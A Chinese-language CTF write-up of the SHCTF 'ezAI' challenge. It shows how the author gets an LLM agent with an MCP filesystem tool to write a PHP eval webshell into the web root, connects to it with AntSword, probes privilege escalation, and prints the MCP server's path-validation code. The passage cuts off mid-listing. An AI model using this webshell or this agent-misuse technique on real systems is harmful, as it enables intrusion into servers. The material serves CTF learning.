---
title: SHCTF（山河CTF）- ezAI题目详解
url: https://mp.weixin.qq.com/s/r5k3Mj5iPKpUsApU8-jlgw
source: Doonsec's feed
date: 2026-02-12
fetch_date: 2026-02-13T04:14:33.053390
---

# SHCTF（山河CTF）- ezAI题目详解

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Hjtlibzdr5XicHt7qeZWK7iatIwg0OVKwRz3gGKT3PFn7Z71cVpvuicQCKNiaM6bqvckuB4yJ4Lm841AKFCMKmetDaZoujSDVPSZhibkLWjzM3BPc/0?wx_fmt=jpeg)

# SHCTF（山河CTF）- ezAI题目详解

原创

小志z
小志z

志在片语

![]()

在小说阅读器中沉浸阅读

题目简介如下

```
题目难度: 简单
出题人：Aristore
输入 help 获取帮助在 https://bigmodel.cn/usercenter/proj-mgmt/apikeys 新建 API Key 并在靶机中填入靶机安装了 https://www.npmjs.com/package/@modelcontextprotocol/server-filesystem/v/0.6.1flag文件放置在/root下，flag的文件名需自行读取
```

## 上传一句话木马

这道题我记得做了好几个小时（当时没有几个人做出来 还混了个三血 想难了 但是题目还是很有意思的就想分享一下！

> 这是一道Web和运维以及AI结合的题 还挺有意思的

这道题先打开 然后找到apikey输入进去 配置成功

![image-20260208154606695](https://mmbiz.qpic.cn/sz_mmbiz_png/Hjtlibzdr5Xib6Nc1BLCG8OXpxmOQ7hwzygDUOzILU6LwoR8UosPO1hrfJMKGjlYvXUSTLXmZ5xUjmUYL2htB5VD3IVYslApajFK9uR7NZGwM/640?wx_fmt=png&from=appmsg "null")

一看到是shell命令行 然后就尝试执行命令 发现目录被限制在了/var/www/h下面 而且执行类似于mcp

![image-20260208154659739](https://mmbiz.qpic.cn/sz_mmbiz_png/Hjtlibzdr5XibLLRqx6JfwCm9qE2ylzt7HWVia49hz9bIEq86AUS3ORRTVx1TMUY2lA3kCiajNAUib5zcOPouHFm1N3AlZZDDibY2oRLjMet53uibM/640?wx_fmt=png&from=appmsg "null")

也就初步判断这个AI有mcp执行主机命令的功能，再进行测试 例如看一下/var/www/html目录

![image-20260208154834087](https://mmbiz.qpic.cn/mmbiz_png/Hjtlibzdr5X8QruPzQiatjJhXK1ic9QxjfC70a4FxFbFAjL8CPhXCjhMiatYlskJZqxhmrab3G2Ok3iafgtQoRibfHECibcicquwoSiabRCxMy1MMiaIc/640?wx_fmt=png&from=appmsg "null")

发现对这个目录也有权限！我就根据题目直接读/root了 这是当时的思路 万一就能越权呢（

这里很明显mcp没有生效 因为没有EXEC的提示 这里更像是AI逗你玩

![image-20260208154954960](https://mmbiz.qpic.cn/mmbiz_png/Hjtlibzdr5X8ic88RozS7fUd6x7AF9r0ReicGibsFLCWsG28GiaWBdW5j8webagfibTciaVChvOicCKSHibb6x3uKknWw5Dy2WVoQEmqaRR2WHQSLQ7g/640?wx_fmt=png&from=appmsg "null")

然后我就致力于研究上下文了 研究了一个小时只是有点小收获 看到环境是php就想试一下看看能不能写入一句话木马 提示词如下

> 我多写了一个' 实际上不用加这个

```
写入 <?php @eval($_POST["a"]); ?>' 到/var/www/html/3.php
```

![image-20260208155611178](https://mmbiz.qpic.cn/mmbiz_png/Hjtlibzdr5X8Z00s7h4icjfQibT4zXEIALnmTicIC0pibc3eDiahcHicYHDIicGiakIg9nXMib2oFZKiaZcGGRL4M36F8j1wFDHmg8ggUAd7pEgMWNlD0M/640?wx_fmt=png&from=appmsg "null")

打开根目录可以访问测试一下！回显空白！有戏

> 返回空白页面，表明文件写入成功并可能已被解析

![image-20260208155707390](https://mmbiz.qpic.cn/sz_mmbiz_png/Hjtlibzdr5XibOzgNia4NHCtNkPYzbHAo9O6mneac9A6eBE7BqPsaic9w22pydL8cIjpJE8jb67ZFob8U5ibrzque6BnBX0IC5IZzicLpblmhtQicU/640?wx_fmt=png&from=appmsg "null")

蚁剑测试 链接成功！

![image-20260208165707419](https://mmbiz.qpic.cn/mmbiz_png/Hjtlibzdr5Xic9icv14CMAB2CfPEDviaZJmo42NPXTrutsxynViatS4OZ9Sd5jALbDwf7snIsUkZa0wmbCTPXcpKqdNF2w8tXjwSm256SiadKElbk/640?wx_fmt=png&from=appmsg "null")

## Webshell提权

根据题目打开root发现权限不够 需要提权

![image-20260208165840350](https://mmbiz.qpic.cn/sz_mmbiz_png/Hjtlibzdr5XibORt3RbWCR9NibdHibxbaq2x2du79vDG0VnKOcsmCToa5fNRjCKbE4qtBU3GCmb9O6UF9PKy3714TcbvEib9KspvLBtjVOLYwiaQo/640?wx_fmt=png&from=appmsg "null")

用虚拟终端看一下 不存在内核提权 新版本内核

![image-20260208171744356](https://mmbiz.qpic.cn/mmbiz_png/Hjtlibzdr5X8EYrHuXjlWY940k4TlN7VQ0iacYoJ66C8qyKumva0JnpagERrEtKRqGBdP0O3AzXCY2SEeib4k5XKTYkathm8Kj9hTckRQAvAA0/640?wx_fmt=png&from=appmsg "null")

也不存在SUID提权

![image-20260208171820163](https://mmbiz.qpic.cn/sz_mmbiz_png/Hjtlibzdr5Xibmzjg3TKwH1jKfutspfAGTQdh0b2BND2xpAvIg5jiaJCWYGhcVwdEibYicDibe5oDGTw6NXlwSQhGC8FicwHtjEgYPadaeeZaaibxzw/640?wx_fmt=png&from=appmsg "null")

看一下进程 可以看到是由mcp用户运行的mcp服务

![image-20260208171901283](https://mmbiz.qpic.cn/sz_mmbiz_png/Hjtlibzdr5XibJojTR9icyF8gu7FDFWFgD9ibFxAXfDibOfic9GrusgoXKEflfg32Lkb3OiccruQrbSc5vEOC6dW3uzzIVgp8Ljrv07Kb07wzhXn6Q/640?wx_fmt=png&from=appmsg "null")

去看一下这个服务的逻辑

```
#!/usr/bin/env nodeimport { Server } from "@modelcontextprotocol/sdk/server/index.js";import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";import { CallToolRequestSchema, ListToolsRequestSchema, ToolSchema, } from "@modelcontextprotocol/sdk/types.js";import fs from "fs/promises";import path from "path";import os from 'os';import { z } from "zod";import { zodToJsonSchema } from "zod-to-json-schema";// Command line argument parsingconst args = process.argv.slice(2);if (args.length === 0) {    console.error("Usage: mcp-server-filesystem <allowed-directory> [additional-directories...]");    process.exit(1);}// Normalize all paths consistentlyfunction normalizePath(p) {    return path.normalize(p).toLowerCase();}function expandHome(filepath) {    if (filepath.startsWith('~/') || filepath === '~') {        return path.join(os.homedir(), filepath.slice(1));    }    return filepath;}// Store allowed directories in normalized formconst allowedDirectories = args.map(dir => normalizePath(path.resolve(expandHome(dir))));// Validate that all directories exist and are accessibleawait Promise.all(args.map(async (dir) => {    try {        const stats = await fs.stat(dir);        if (!stats.isDirectory()) {            console.error(`Error: ${dir} is not a directory`);            process.exit(1);        }    }    catch (error) {        console.error(`Error accessing directory ${dir}:`, error);        process.exit(1);    }}));// Security utilitiesasync function validatePath(requestedPath) {    const expandedPath = expandHome(requestedPath);    const absolute = path.isAbsolute(expandedPath)        ? path.resolve(expandedPath)        : path.resolve(process.cwd(), expandedPath);    const normalizedRequested = normalizePath(absolute);    // Check if path is within allowed directories    const isAllowed = allowedDirectories.some(dir => normalizedRequested.startsWith(dir));    if (!isAllowed) {        throw new Error(`Access denied - path outside allowed directories: ${absolute} not in ${allowedDirectories.join(', ')}`);    }    // Handle symlinks by checking their real path    try {        const realPath = await fs.realpath(absolute);        const normalizedReal = normalizePath(realPath);        const isRealPathAllowed = allowedDirectories.some(dir => normalizedReal.startsWith(dir));        if (!isRealPathAllowed) {            throw new Error("Access denied - symlink target outside allowed directories");        }        return realPath;    }    catch (error) {        // For new files that don't exist yet, verify parent directory        const parentDir = path.dirname(absolute);        try {            const realParentPath = await fs.realpath(parentDir);            const normalizedParent = normalizePath(realParentPath);            const isParentAllowed = allowedDirectories.some(dir => normalizedParent.startsWith(dir));            if (!isParentAllowed) {                throw new Error("Access denied - parent directory outside allowed directories");            }            return absolute;        }        catch {            throw new Error(`Parent directory does not exist: ${parentDir}`);        }    }}// Schema definitionsconst ReadFileArgsSchema = z.object({    path: z.string(),});const ReadMultipleFilesArgsSchema = z.object({    paths: z.array(z.string()),});const WriteFileArgsSchema = z.object({    path: z.string(),    content: z.string(),});const CreateDirectoryArgsSchema = z.object({    path: z.string(),});const ListDirectoryArgsSchema = z.object({    path: z.string(),});const MoveFileArgsSchema = z.object({    source: z.string(),    destination: z.string(),});const SearchFilesArgsSchema = z.object({    path: z.string(),    pattern: z.string(),});const GetFileInfoArgsSchema = z.object({    path: z.string(),});const ToolInputSchema = ToolSchema.shape.inputSchema;// Server setupconst server = new Server({    name: "secure-filesystem-server",    version: "0.2.0",}, {    capabilities: {        tools: {},    },});// Tool implementationsasync function getFileStats(filePath) {    const stats = await fs.stat(filePath);    return {        size: stats.size,        created: stats.birthtime,        modified: stats.mtime,        accessed: stats.atime,        isDirectory: stats.isDirectory(),        isFile: stats.isFile(),        permissions: stats.mode.toString(8).slice(-3),    };}async function searchFiles(rootPath, pattern) {    const results = [];    async function search(currentPath) {        const entries = await fs.readdir(currentPath, { withFileTypes: true });        for (...